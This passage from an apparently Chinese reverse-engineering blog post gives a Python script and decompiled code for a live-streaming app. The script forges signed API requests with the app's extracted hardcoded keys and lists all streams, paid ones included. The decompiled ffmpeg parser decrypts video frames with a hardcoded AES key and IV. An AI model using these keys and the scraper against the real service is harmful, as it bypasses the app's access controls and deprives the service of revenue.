class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> pytz</span><br><span class="line"></span><br><span class="line">SIGN_API_KEY = <span class="string">&#x27;8zy8nbs9lyddx02slcz8ypmwcr2tlu72&#x27;</span></span><br><span class="line">deviceId = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.hexdigits + string.digits, k=<span class="number">16</span>)).lower()</span><br><span class="line">user = &#123;&#125;</span><br><span class="line">openId = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getsign</span>(<span class="params">postdata=<span class="literal">None</span></span>):</span><br><span class="line">    <span class="keyword">if</span> postdata <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        postdata = &#123;&#125;</span><br><span class="line">    randomStr = <span class="string">&#x27;&#x27;</span>.join(random.choices(string.ascii_letters + string.digits, k=<span class="number">16</span>))</span><br><span class="line">    sdict = &#123;<span class="string">&#x27;deviceId&#x27;</span>: deviceId, <span class="string">&#x27;randomStr&#x27;</span>: randomStr, <span class="string">&#x27;timeStampStr&#x27;</span>: <span class="built_in">str</span>(<span class="built_in">int</span>(time.time()))&#125;</span><br><span class="line">    sdict_ = <span class="built_in">dict</span>(<span class="built_in">sorted</span>(&#123;**sdict, **postdata&#125;.items()))</span><br><span class="line">    sd = SIGN_API_KEY + <span class="string">&#x27;_&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> sdict_.items():</span><br><span class="line">        sd = sd + k.upper() + <span class="string">&#x27;=&#x27;</span> + v.upper() + <span class="string">&#x27;&amp;&#x27;</span></span><br><span class="line">    sd = sd[:-<span class="number">1</span>]</span><br><span class="line">    sign = hashlib.md5(sd.encode(<span class="string">&#x27;utf8&#x27;</span>)).hexdigest()</span><br><span class="line">    <span class="keyword">return</span> sdict, sign</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getheader</span>():</span><br><span class="line">    header = &#123;<span class="string">&#x27;deviceType&#x27;</span>: <span class="string">&#x27;android&#x27;</span>, <span class="string">&#x27;appId&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;appKey&#x27;</span>: <span class="string">&#x27;016c6dd0-0531-4c7f-a531-52b76f0d366c&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;osVersion&#x27;</span>: <span class="string">&#x27;10.0&#x27;</span>, <span class="string">&#x27;sdkVersion&#x27;</span>: <span class="string">&#x27;3.4.1&#x27;</span>, <span class="string">&#x27;deviceName&#x27;</span>: <span class="string">&#x27;iphone11pm&#x27;</span>, <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>,</span><br><span class="line">              <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json; charset=UTF-8&#x27;</span>, <span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;okhttp/3.11.0&#x27;</span>, <span class="string">&#x27;openId&#x27;</span>: openId&#125;</span><br><span class="line">    <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://api.hndwsm.com/tl/auth/userService/mobile/index/syncUserInfo2LiveModuleAndGetToken</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sync</span>():</span><br><span class="line">    <span class="keyword">global</span> openId, user</span><br><span class="line">    header = &#123;</span><br><span class="line">        <span class="string">&#x27;apkChannelId&#x27;</span>: <span class="string">&#x27;001&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;appId&#x27;</span>: <span class="string">&#x27;1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;deviceNo&#x27;</span>: deviceId * <span class="number">2</span>,</span><br><span class="line">        <span class="string">&#x27;netStatus&#x27;</span>: <span class="string">&#x27;WIFI&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;versionNo&#x27;</span>: <span class="string">&#x27;342001201&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;Connection&#x27;</span>: <span class="string">&#x27;Keep-Alive&#x27;</span>&#125;</span><br><span class="line">    luser = requests.post(<span class="string">&#x27;https://api.lck03.xyz/eStBMUNFTjZXWGxDcGswNnNIcnlkdjNpUExQTTZDWWQzd0Q0Nld&#x27;</span></span><br><span class="line">                          <span class="string">&#x27;XZ0xnST0BTVRZek5UYzNNRFV4TnpjM016TXhOdz09.do&#x27;</span>, data=<span class="string">&#x27;&#x27;</span>, headers=header)</span><br><span class="line">    luserj = luser.json()</span><br><span class="line">    openId = <span class="built_in">str</span>(luserj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;id&#x27;</span>])</span><br><span class="line">    puserj = &#123;<span class="string">&quot;isRisk&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;ntoken&quot;</span>: luserj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;liveToken&#x27;</span>], <span class="string">&quot;userId&quot;</span>: openId,</span><br><span class="line">              <span class="string">&quot;avatar&quot;</span>: <span class="string">&quot;https://www.google.com/logos/doodles/2021/halloween-2021-6753651837109122.2-2xa.gif&quot;</span>,</span><br><span class="line">              <span class="string">&quot;name&quot;</span>: luserj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;inviteCode&#x27;</span>], <span class="string">&quot;isLogin&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;sex&quot;</span>: <span class="string">&quot;1&quot;</span>&#125;</span><br><span class="line">    header = getheader()</span><br><span class="line">    sdict, sign = getsign(puserj)</span><br><span class="line">    header = &#123;**header, <span class="string">&#x27;sign&#x27;</span>: sign, **sdict, <span class="string">&#x27;token&#x27;</span>: <span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;userId&#x27;</span>: <span class="string">&#x27;&#x27;</span>&#125;</span><br><span class="line">    ruser = requests.post(<span class="string">&#x27;https://api.hndwsm.com/tl/auth/userService/mobile/index/syncUserInfo2LiveModuleAndGetToken&#x27;</span>,</span><br><span class="line">                          json.dumps(puserj), headers=header)</span><br><span class="line">    ruserj = ruser.json()</span><br><span class="line">    ad = Appdec()</span><br><span class="line">    u = ad.decodelive(ruserj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>], ruserj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    uj = json.loads(u)</span><br><span class="line">    <span class="built_in">print</span>(uj)</span><br><span class="line">    user = &#123;<span class="string">&#x27;userId&#x27;</span>: uj[<span class="string">&#x27;userId&#x27;</span>], <span class="string">&#x27;token&#x27;</span>: uj[<span class="string">&#x27;token&#x27;</span>]&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># https://api.hndwsm.com/tl/index/live/list</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">livelist</span>(<span class="params">pageNumber=<span class="number">1</span></span>):</span><br><span class="line">    header = getheader()</span><br><span class="line">    sdict, sign = getsign()</span><br><span class="line">    header = &#123;**header, **sdict, **user, <span class="string">&#x27;sign&#x27;</span>: sign, <span class="string">&#x27;openId&#x27;</span>: openId&#125;</span><br><span class="line">    postdata = &#123;<span class="string">&quot;pageNumber&quot;</span>: pageNumber, <span class="string">&quot;pageSize&quot;</span>: <span class="number">40</span>&#125;</span><br><span class="line">    r = requests.post(<span class="string">&#x27;https://api.hndwsm.com/tl/index/live/list&#x27;</span>,</span><br><span class="line">                      postdata.__str__(), headers=header)</span><br><span class="line">    rj = r.json()</span><br><span class="line">    ad = Appdec()</span><br><span class="line">    llist = ad.decodelive(rj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;data&#x27;</span>], rj[<span class="string">&#x27;data&#x27;</span>][<span class="string">&#x27;key&#x27;</span>])</span><br><span class="line">    lj = json.loads(llist)</span><br><span class="line">    <span class="keyword">return</span> lj</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># http://down.tsfsb.com/</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">process</span>(<span class="params">alllist</span>):</span><br><span class="line">    data = alllist[<span class="string">&#x27;dataList&#x27;</span>]</span><br><span class="line">    data.sort(key=<span class="keyword">lambda</span> x: x[<span class="string">&quot;onlineUserCount&quot;</span>], reverse=<span class="literal">True</span>)</span><br><span class="line">    onlineUserCount = <span class="number">0</span></span><br><span class="line">    freeList = []</span><br><span class="line">    chargeList = []</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;coverIdentityUrl&#x27;</span> <span class="keyword">in</span> j <span class="keyword">and</span> <span class="keyword">not</span> j[<span class="string">&#x27;coverIdentityUrl&#x27;</span>].startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            j[<span class="string">&#x27;coverIdentityUrl&#x27;</span>] = <span class="string">&#x27;http://down.tsfsb.com/&#x27;</span> + j[<span class="string">&#x27;coverIdentityUrl&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;liveCoverUrl&#x27;</span> <span class="keyword">in</span> j <span class="keyword">and</span> <span class="keyword">not</span> j[<span class="string">&#x27;liveCoverUrl&#x27;</span>].startswith(<span class="string">&#x27;http&#x27;</span>):</span><br><span class="line">            j[<span class="string">&#x27;liveCoverUrl&#x27;</span>] = <span class="string">&#x27;http://down.tsfsb.com/&#x27;</span> + j[<span class="string">&#x27;liveCoverUrl&#x27;</span>]</span><br><span class="line">        j[<span class="string">&#x27;pullStreamUrl&#x27;</span>] = j[<span class="string">&#x27;pullStreamUrl&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        j[<span class="string">&#x27;lowDefinitionPullStreamUrl&#x27;</span>] = j[<span class="string">&#x27;lowDefinitionPullStreamUrl&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        j[<span class="string">&#x27;lowDefinitionPullStreamUrlH265&#x27;</span>] = j[<span class="string">&#x27;lowDefinitionPullStreamUrlH265&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        j[<span class="string">&#x27;pullStreamUrlH265&#x27;</span>] = j[<span class="string">&#x27;pullStreamUrlH265&#x27;</span>].split(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">        starttime = datetime.fromtimestamp(j[<span class="string">&#x27;startTime&#x27;</span>], pytz.timezone(<span class="string">&#x27;Asia/Shanghai&#x27;</span>))</span><br><span class="line">        j[<span class="string">&#x27;startTime&#x27;</span>] = starttime.strftime(<span class="string">&#x27;%d/%m %H:%M:%S&#x27;</span>)</span><br><span class="line">        onlineUserCount += j[<span class="string">&#x27;onlineUserCount&#x27;</span>]</span><br><span class="line">        <span class="keyword">if</span> j[<span class="string">&#x27;chargeType&#x27;</span>] == <span class="number">0</span>:</span><br><span class="line">            freeList.append(j)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            chargeList.append(j)</span><br><span class="line">    alllist[<span class="string">&#x27;pageSize&#x27;</span>] = alllist[<span class="string">&#x27;totalRowsCount&#x27;</span>]</span><br><span class="line">    alllist[<span class="string">&#x27;totalPageCount&#x27;</span>] = <span class="number">1</span></span><br><span class="line">    alllist[<span class="string">&#x27;onlineUserCount&#x27;</span>] = onlineUserCount</span><br><span class="line">    alllist.pop(<span class="string">&#x27;dataList&#x27;</span>, <span class="literal">None</span>)</span><br><span class="line">    alllist[<span class="string">&#x27;freeList&#x27;</span>] = freeList</span><br><span class="line">    alllist[<span class="string">&#x27;chargeList&#x27;</span>] = chargeList</span><br><span class="line">    <span class="keyword">return</span> alllist</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">datalist</span>():</span><br><span class="line">    sync()</span><br><span class="line">    first = livelist()</span><br><span class="line">    totalPageCount = first[<span class="string">&#x27;totalPageCount&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, totalPageCount+<span class="number">1</span>):</span><br><span class="line">        curlist = livelist(i)</span><br><span class="line">        first[<span class="string">&#x27;dataList&#x27;</span>] += curlist[<span class="string">&#x27;dataList&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">len</span>(first[<span class="string">&#x27;dataList&#x27;</span>]))</span><br><span class="line">    first = process(first)</span><br><span class="line">    <span class="keyword">return</span> first</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&#x27;dec.json&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, encoding=<span class="string">&#x27;utf8&#x27;</span>)</span><br><span class="line">json.dump(datalist(), f, indent=<span class="number">2</span>, ensure_ascii=<span class="literal">False</span>, sort_keys=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="libfqffmpeg"><a href="#libfqffmpeg" class="headerlink" title="libfqffmpeg"></a>libfqffmpeg</h2><p>在搞完 aliplayer 之后，对基础的音视频处理算是有了一个小经验，结合上次的经验，有了现在的进展。<br>用 IDA PRO 打开 libfqffmpeg.so 之后，查看 exports 一栏，从头看到尾，有一个的命名非常可疑，叫做 decrypt。<br>进去一看，是用 openssl 解密的函数，查看 xref，发现只有一个函数 sub_B8228 调用了这个解密函数。<br>这个函数究竟做什么事情的呢？根据关键词搜索，发现是 ffmpeg 中的一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">sub_B8228</span><span class="params">(_DWORD *AVCodecParserContext_s, _DWORD *avctx, _DWORD *poutbuf, _DWORD *poutbuf_size, _BYTE *buf, <span class="type">int</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 一些参数</span></span><br><span class="line"></span><br><span class="line">  v6 = *AVCodecParserContext_s;</span><br><span class="line">  <span class="keyword">if</span> ( !*(_DWORD *)(*AVCodecParserContext_s + <span class="number">1640</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    v9 = avctx[<span class="number">26</span>];</span><br><span class="line">    *(_DWORD *)(v6 + <span class="number">1640</span>) = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v9 )</span><br><span class="line">      ff_h264_decode_extradata(avctx[<span class="number">25</span>], v9, v6 + <span class="number">40</span>, v6 + <span class="number">1632</span>, v6 + <span class="number">1636</span>, avctx[<span class="number">172</span>], avctx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (AVCodecParserContext_s[<span class="number">44</span>] &amp; <span class="number">1</span>) != <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    next = buf_size;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    next = h264_find_frame_end(v6, (<span class="type">int</span>)buf, buf_size, (<span class="type">int</span>)avctx);</span><br><span class="line">    <span class="keyword">if</span> ( ff_combine_frame(v6, next, &amp;buf, &amp;buf_size) &lt; <span class="number">0</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      result = buf_size;</span><br><span class="line">      *poutbuf = <span class="number">0</span>;</span><br><span class="line">      *poutbuf_size = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( next &lt; <span class="number">0</span> &amp;&amp; next != <span class="number">-100</span> )</span><br><span class="line">      h264_find_frame_end(v6, *(_DWORD *)(v6 + <span class="number">8</span>) + next + *(_DWORD *)v6, -next, (<span class="type">int</span>)avctx);</span><br><span class="line">  &#125;</span><br><span class="line">  nal_length_size = *(_DWORD *)(*AVCodecParserContext_s + <span class="number">1636</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; custom_head_size; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)buf[nal_length_size + i] != custom_header[i] )</span><br><span class="line">      <span class="keyword">goto</span> parse_nal_units;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; nal_length_size; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    v14 = buf[j];</span><br><span class="line">    v15 = &amp;buf[j];</span><br><span class="line">    v15[custom_head_size] = v14;</span><br><span class="line">  &#125;</span><br><span class="line">  buf += custom_head_size;</span><br><span class="line">  v17 = buf + <span class="number">4</span>;</span><br><span class="line">  buf_size -= custom_head_size;</span><br><span class="line">  v16 = buf_size;</span><br><span class="line">  v18 = EVP_aes_128_cfb128();</span><br><span class="line">  decrypt((<span class="type">int</span>)v18, (<span class="type">int</span>)v17, v16 - <span class="number">4</span>, (<span class="type">int</span>)<span class="string">&quot;1234567890qwerty&quot;</span>, (<span class="type">int</span>)<span class="string">&quot;0123456789abcdef&quot;</span>, (<span class="type">int</span>)v17);</span><br><span class="line">parse_nal_units:                                <span class="comment">// // parse_nal_units</span></span><br><span class="line">  <span class="comment">// parse_nal_units 函数调用</span></span><br><span class="line">LABEL_165:</span><br><span class="line">  <span class="keyword">if</span> ( avctx[<span class="number">220</span>] )</span><br><span class="line">  &#123;</span><br><span class="line">    v83 = avctx[<span class="number">29</span>];</span><br><span class="line">    v104 = <span class="number">1</span>;</span><br><span class="line">    v103 = v83;</span><br><span class="line">    av_mul_q(s, avctx[<span class="number">220</span>], avctx[<span class="number">221</span>]);</span><br><span class="line">    avctx[<span class="number">27</span>] = s[<span class="number">1</span>];</span><br><span class="line">    avctx[<span class="number">28</span>] = s[<span class="number">0</span>];</span><br><span class="line">  &#125;</span><br><span class="line">  v84 = *(_DWORD *)(v6 + <span class="number">1404</span>);</span><br><span class="line">  v85 = v84 &lt; <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v84 &lt; <span class="number">0</span> )</span><br><span class="line">    v84 = <span class="number">0x80000000</span>;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v23 = *(_DWORD *)(v6 + <span class="number">1432</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v85 )</span><br><span class="line">  &#123;</span><br><span class="line">    AVCodecParserContext_s[<span class="number">60</span>] = v84;</span><br><span class="line">    AVCodecParserContext_s[<span class="number">61</span>] = v84;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    AVCodecParserContext_s[<span class="number">61</span>] = v84;</span><br><span class="line">    v84 = *(_DWORD *)(v6 + <span class="number">1400</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  AVCodecParserContext_s[<span class="number">62</span>] = v84;</span><br><span class="line">  v86 = AVCodecParserContext_s[<span class="number">44</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !v85 )</span><br><span class="line">    AVCodecParserContext_s[<span class="number">60</span>] = v23;</span><br><span class="line">  <span class="keyword">if</span> ( (v86 &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">    AVCodecParserContext_s[<span class="number">44</span>] = v86 &amp; <span class="number">1</span>;</span><br><span class="line">  v99 = AVCodecParserContext_s[<span class="number">60</span>];</span><br><span class="line">  <span class="keyword">if</span> ( v99 &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v87 = (<span class="type">int</span>)avctx[<span class="number">28</span>] * (__int64)(<span class="type">int</span>)avctx[<span class="number">223</span>];</span><br><span class="line">    <span class="keyword">if</span> ( v87 &gt;= <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v88 = *((_QWORD *)AVCodecParserContext_s + <span class="number">6</span>);</span><br><span class="line">      v89 = HIDWORD(v88) == <span class="number">0x80000000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v88) == <span class="number">0x80000000</span> )</span><br><span class="line">        v89 = (_DWORD)v88 == <span class="number">0</span>;</span><br><span class="line">      v90 = (<span class="type">int</span>)avctx[<span class="number">27</span>] * (__int64)(<span class="type">int</span>)avctx[<span class="number">224</span>];</span><br><span class="line">      <span class="keyword">if</span> ( v89 )</span><br><span class="line">      &#123;</span><br><span class="line">        v91 = *(_QWORD *)(v6 + <span class="number">1664</span>);</span><br><span class="line">        v92 = HIDWORD(v91) == <span class="number">0x80000000</span>;</span><br><span class="line">        <span class="keyword">if</span> ( HIDWORD(v91) == <span class="number">0x80000000</span> )</span><br><span class="line">          v92 = (_DWORD)v91 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( !v92 )</span><br><span class="line">          *((_QWORD *)AVCodecParserContext_s + <span class="number">6</span>) = av_rescale(</span><br><span class="line">                                                      AVCodecParserContext_s[<span class="number">61</span>],</span><br><span class="line">                                                      (<span class="type">int</span>)AVCodecParserContext_s[<span class="number">61</span>] &gt;&gt; <span class="number">31</span>,</span><br><span class="line">                                                      v90,</span><br><span class="line">                                                      HIDWORD(v90),</span><br><span class="line">                                                      v87,</span><br><span class="line">                                                      HIDWORD(v87))</span><br><span class="line">                                                  + v91;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        *(_QWORD *)(v6 + <span class="number">1664</span>) = v88</span><br><span class="line">                               - av_rescale(</span><br><span class="line">                                   AVCodecParserContext_s[<span class="number">61</span>],</span><br><span class="line">                                   (<span class="type">int</span>)AVCodecParserContext_s[<span class="number">61</span>] &gt;&gt; <span class="number">31</span>,</span><br><span class="line">                                   v90,</span><br><span class="line">                                   HIDWORD(v90),</span><br><span class="line">                                   v87,</span><br><span class="line">                                   HIDWORD(v87));</span><br><span class="line">      &#125;</span><br><span class="line">      v93 = *(_QWORD *)(v6 + <span class="number">1664</span>);</span><br><span class="line">      v94 = HIDWORD(v93) == <span class="number">0x80000000</span>;</span><br><span class="line">      <span class="keyword">if</span> ( HIDWORD(v93) == <span class="number">0x80000000</span> )</span><br><span class="line">        v94 = (_DWORD)v93 == <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !v94 )</span><br><span class="line">      &#123;</span><br><span class="line">        v95 = *((_QWORD *)AVCodecParserContext_s + <span class="number">5</span>);</span><br><span class="line">        v96 = HIDWORD(v95) == <span class="number">0x80000000</span>;</span><br><span class="line">        <span class="keyword">if</span> ( HIDWORD(v95) == <span class="number">0x80000000</span> )</span><br><span class="line">          v96 = (_DWORD)v95 == <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v96 )</span><br><span class="line">          *((_QWORD *)AVCodecParserContext_s + <span class="number">5</span>) = av_rescale(</span><br><span class="line">                                                      AVCodecParserContext_s[<span class="number">62</span>],</span><br><span class="line">                                                      (<span class="type">int</span>)AVCodecParserContext_s[<span class="number">62</span>] &gt;&gt; <span class="number">31</span>,</span><br><span class="line">                                                      v90,</span><br><span class="line">                                                      HIDWORD(v90),</span><br><span class="line">                                                      v87,</span><br><span class="line">                                                      HIDWORD(v87))</span><br><span class="line">                                                  + *((_QWORD *)AVCodecParserContext_s + <span class="number">6</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v99 )</span><br><span class="line">        *(_QWORD *)(v6 + <span class="number">1664</span>) = *((_QWORD *)AVCodecParserContext_s + <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  result = next;</span><br><span class="line">  *poutbuf = buf;</span><br><span class="line">  *poutbuf_size = buf_size;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面代码中的黄色部分，就是较源码中添加的部分，下面看一下源码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">h264_parse</span><span class="params">(AVCodecParserContext *s,</span></span><br><span class="line"><span class="params">                      AVCodecContext *avctx,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span> **poutbuf, <span class="type">int</span> *poutbuf_size,</span></span><br><span class="line"><span class="params">                      <span class="type">const</span> <span class="type">uint8_t</span> *buf, <span class="type">int</span> buf_size)</span></span><br><span class="line">&#123;</span><br><span class="line">    H264ParseContext *p = s-&gt;priv_data;</span><br><span class="line">    ParseContext *pc = &amp;p-&gt;pc;</span><br><span class="line">    <span class="type">int</span> next;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!p-&gt;got_first) &#123;</span><br><span class="line">        p-&gt;got_first = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (avctx-&gt;extradata_size) &#123;</span><br><span class="line">            ff_h264_decode_extradata(avctx-&gt;extradata, 